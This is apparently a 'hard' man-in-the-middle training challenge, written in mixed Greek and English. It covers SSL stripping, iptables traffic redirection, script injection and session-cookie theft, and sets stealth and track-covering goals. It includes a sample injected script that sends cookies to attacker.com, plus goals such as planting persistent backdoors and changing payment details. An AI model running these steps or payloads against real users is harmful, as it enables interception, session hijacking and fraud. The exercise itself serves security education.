# 🔴 Challenge 3: Advanced MITM - HTTPS Downgrade & Injection (HARD)

## 📋 Objective

Perform an **advanced MITM attack** που περιλαμβάνει:
1. SSL Stripping (HTTPS → HTTP downgrade)
2. Content injection (inject malicious JavaScript)
3. Session hijacking
4. Stealthy operation (minimize detection)

**Δυσκολία**: 🔴 Advanced
**Χρόνος**: 1-2 ώρες
**Skills**: SSL/TLS, proxy configuration, traffic manipulation, evasion

---

## 🎯 Mission Brief

**Scenario**: Ένας user browsing σε έναν "secure" website (HTTPS). Εσύ πρέπει να:

1. **Downgrade HTTPS → HTTP** (SSL stripping)
2. **Inject malicious JavaScript** στο response
3. **Steal session cookies**
4. **Maintain stealth** (victim δεν πρέπει να καταλάβει)

**Target**: Victim browsing `https://example.com` (ή δικό σου test site)

**Success**: Inject ένα custom alert() στην webpage του victim

---

## 🧠 What You Need to Figure Out

Δεν θα σου δώσω step-by-step οδηγίες. Πρέπει να ερευνήσεις μόνος σου!

### Core Questions to Answer:

1. **Πώς γίνεται SSL stripping;**
   - Τι tool μπορώ να χρησιμοποιήσω;
   - Πώς αναγκάζω τον victim να χρησιμοποιεί HTTP;

2. **Πώς inject content σε HTTP response;**
   - Χρειάζομαι proxy;
   - Πώς modify on-the-fly;

3. **Πώς κρύβω την επίθεση;**
   - Πώς αποφεύγω browser warnings;
   - Πώς minimize latency;

4. **Πώς steal session cookies;**
   - Που βρίσκονται τα cookies;
   - Πώς τα exfiltrate;

---

## 🛠️ Tools You Might Need

Research these tools:

- **sslstrip** - SSL stripping attack tool
- **mitmproxy** - HTTP/HTTPS proxy με scripting
- **bettercap** - All-in-one MITM framework
- **ettercap** - Network interceptor/sniffer
- **iptables** - Traffic redirection

**Your task**: Figure out **which tools** to use and **how** to use them.

---

## 📚 Background Reading

### What is SSL Stripping?

```
Normal HTTPS connection:
Client → HTTPS → Server
[All encrypted - attacker sees nothing]

SSL Stripping:
Client → HTTP → [Attacker] → HTTPS → Server
         ↑                    ↑
    Unencrypted         Encrypted
    (victim sees)      (server sees)

Attacker:
- Receives HTTPS from server
- Decrypts it
- Sends HTTP to victim
- Victim thinks it's safe!
```

### How Browsers Protect:

1. **HSTS (HTTP Strict Transport Security)**
   - Forces HTTPS for known domains
   - How to bypass? 🤔

2. **Certificate Warnings**
   - Browser shows warning for invalid certs
   - How to avoid triggering? 🤔

3. **HTTPS-Only Mode**
   - Some browsers enforce HTTPS
   - How to downgrade? 🤔

---

## 🎯 Attack Phases

### Phase 1: Positioning (30 min)
- [ ] Setup MITM position (ARP spoofing or rogue AP)
- [ ] Configure traffic redirection
- [ ] Verify you're intercepting traffic

### Phase 2: SSL Stripping (30 min)
- [ ] Setup SSL stripping tool
- [ ] Test with a simple HTTPS site
- [ ] Verify downgrade is working

### Phase 3: Content Injection (30 min)
- [ ] Setup proxy with injection capability
- [ ] Write injection script
- [ ] Test injection on HTTP response

### Phase 4: Full Attack (30 min)
- [ ] Combine SSL strip + injection
- [ ] Test on victim machine
- [ ] Capture session cookies
- [ ] Verify stealth (minimal detection)

---

## 🔍 Research Tasks

Before starting, research these topics:

### 1. SSL Strip Attack
- Read: https://moxie.org/software/sslstrip/
- Understand: How does it work?
- Learn: Common defenses and bypasses

### 2. HSTS Bypass
- Problem: HSTS prevents SSL stripping
- Research: HSTS preload list
- Question: How to bypass on first visit?

### 3. Content Injection
- Tool options: mitmproxy, Burp Suite, custom proxy
- Question: How to inject without breaking page?
- Learn: HTML injection points (`<script>`, `</body>`, etc.)

### 4. Session Hijacking
- Where are session tokens? (Cookies, localStorage, etc.)
- How to exfiltrate? (HTTP request to attacker server)
- How to use them? (Cookie injection, session replay)

---

## 💣 Example Attack Flow (High Level)

```
1. ARP Spoof (you've done this before)
   ↓
2. Redirect HTTP/HTTPS traffic to your proxy
   iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080
   iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-port 8080
   ↓
3. Run SSL strip + proxy
   [Tool of your choice]
   ↓
4. Inject JavaScript in responses
   <script>
     // Send cookies to attacker
     fetch('http://attacker.com/steal?c=' + document.cookie);
   </script>
   ↓
5. Victim loads page → JavaScript runs → Cookies stolen!
```

**Figure out the details yourself!**

---

## 🧪 Testing Scenarios

### Scenario A: HTTPS Bank Login (Simulated)
1. Setup a dummy "bank" site with HTTPS
2. Victim tries to login
3. You strip SSL and capture credentials
4. Bonus: Inject warning message

### Scenario B: Social Media Session Hijacking
1. Victim browses to "social media" site
2. You capture session cookie
3. You use cookie to impersonate victim

### Scenario C: JavaScript Injection
1. Victim browses to any HTTP site
2. You inject custom JavaScript
3. JS runs and sends data to your server

---

## 🎯 Success Criteria

**Minimum**:
- [ ] Successfully strip SSL from at least 1 HTTPS connection
- [ ] Inject JavaScript that executes in victim's browser
- [ ] Capture at least 1 cookie value

**Advanced**:
- [ ] Bypass HSTS on a domain
- [ ] Inject without breaking webpage layout
- [ ] Exfiltrate cookies to your controlled server
- [ ] Maintain attack for 5+ minutes without detection
- [ ] Successfully hijack a session

**Expert**:
- [ ] Bypass HTTPS-only mode
- [ ] Inject persistent backdoor (WebSocket, ServiceWorker)
- [ ] Modify form submission (change payment details, etc.)
- [ ] Zero visible artifacts (no console errors, no visual glitches)

---

## 🚫 No Hints Provided!

This is the **HARD** challenge. Σου έδωσα:
- ✅ The objective
- ✅ Background theory
- ✅ Tools to research
- ✅ High-level attack flow

**You must**:
- ❌ Figure out tool installation
- ❌ Figure out configuration
- ❌ Figure out command syntax
- ❌ Figure out bypass techniques
- ❌ Debug on your own

**Resources allowed**:
- Google searches
- Tool documentation
- Security blogs & papers
- Man pages
- Online tutorials

---

## ⚠️ Common Pitfalls

Watch out for these issues (but you must solve them yourself!):

1. **Certificate errors breaking the attack**
   - Browsers showing big red warnings
   - How to minimize or bypass?

2. **HSTS preventing downgrade**
   - Browser enforcing HTTPS
   - What's the workaround?

3. **Injection breaking HTML**
   - Page doesn't render correctly
   - Where to inject safely?

4. **Getting detected**
   - Victim notices weird behavior
   - How to be more stealthy?

5. **Traffic routing issues**
   - Packets not flowing correctly
   - Is IP forwarding on? Routes correct?

---

## 🎓 Learning Objectives

By completing this challenge, you will master:

✅ **SSL/TLS Attacks**
- SSL stripping
- HSTS bypass techniques
- Certificate manipulation

✅ **Proxy Configuration**
- Transparent proxying
- iptables rules
- Traffic redirection

✅ **Content Injection**
- HTML/JavaScript injection
- Safe injection points
- Payload crafting

✅ **Session Hijacking**
- Cookie stealing
- Token exfiltration
- Session replay attacks

✅ **Operational Security**
- Minimizing detection
- Clean attack teardown
- Covering tracks

---

## 📊 Estimated Difficulty Breakdown

| Task | Difficulty | Time |
|------|-----------|------|
| Research & planning | 🔴🔴🔴 | 30 min |
| Tool setup | 🔴🔴 | 20 min |
| SSL stripping | 🔴🔴🔴🔴 | 40 min |
| Content injection | 🔴🔴🔴 | 30 min |
| Session hijacking | 🔴🔴🔴🔴🔴 | 40 min |
| Stealth & evasion | 🔴🔴🔴🔴 | 30 min |

**Total**: ~2-3 hours for first completion

---

## 🏆 Completion Evidence

When you finish, document:

1. **Screenshots**:
   - Victim browser showing injected content
   - Attacker terminal showing captured cookies
   - Network traffic (Wireshark) showing SSL strip

2. **Logs**:
   - Tool output showing successful interception
   - Captured credentials/cookies
   - Injection payload

3. **Write-up**:
   - Tools used and why
   - Challenges faced
   - How you overcame them
   - Lessons learned

---

## 💀 Real-World Context

This attack is used by:
- **Government surveillance** (PRISM, mass surveillance)
- **ISPs** (injecting ads, tracking)
- **Public Wi-Fi** (captive portals, malicious hotspots)
- **Penetration testers** (authorized security testing)

**Defenses used by targets**:
- HSTS preloading
- Certificate pinning
- DNS-over-HTTPS (DoH)
- VPNs
- Zero-trust networks

---

## 🚀 Beyond This Challenge

If you complete this, try:

1. **Mobile App MITM**
   - Bypass certificate pinning
   - Intercept app API traffic

2. **Enterprise Environment**
   - Bypass corporate proxies
   - Evade IDS/IPS systems

3. **IoT Device MITM**
   - Intercept smart home devices
   - Manipulate firmware updates

---

## ⚖️ Legal Reminder

```
┌────────────────────────────────────────────────┐
│  THIS ATTACK IS HIGHLY ILLEGAL ON REAL USERS   │
│                                                │
│  Penalties for unauthorized MITM:             │
│  • Computer Fraud & Abuse Act violations      │
│  • Wiretapping charges                        │
│  • Identity theft charges                     │
│  • 10+ years prison                           │
│  • $250,000+ fines                            │
│                                                │
│  ONLY use on:                                 │
│  ✅ Your own lab environment                  │
│  ✅ With explicit written permission          │
│  ✅ In authorized pentest engagements         │
└────────────────────────────────────────────────┘
```

---

## 🎯 Final Challenge

**Can you do it without using ANY existing tools?**

Write your own:
- ARP spoofer (pure Python/C)
- HTTP proxy (from scratch)
- SSL strip logic (custom implementation)
- Injection engine (your code)

**No Scapy, no mitmproxy, no bettercap.**
**Just raw sockets and your brain.** 🧠

---

**Good luck, hacker. You'll need it.** 🎭

---

## 📚 Recommended Reading (AFTER attempting!)

Once you've tried on your own, check these resources:

- "SSL Stripping Attacks" by Moxie Marlinspike
- "The Tangled Web" by Michal Zalewski
- "Web Application Hacker's Handbook" Ch. 13
- OWASP MITM Attack Guide
- RFC 6797 (HSTS Specification)

**Remember**: Reading the solution before attempting = learning nothing!

---

**End of Hard Challenge**

If you completed this, you're ready for real penetration testing work! 🚀
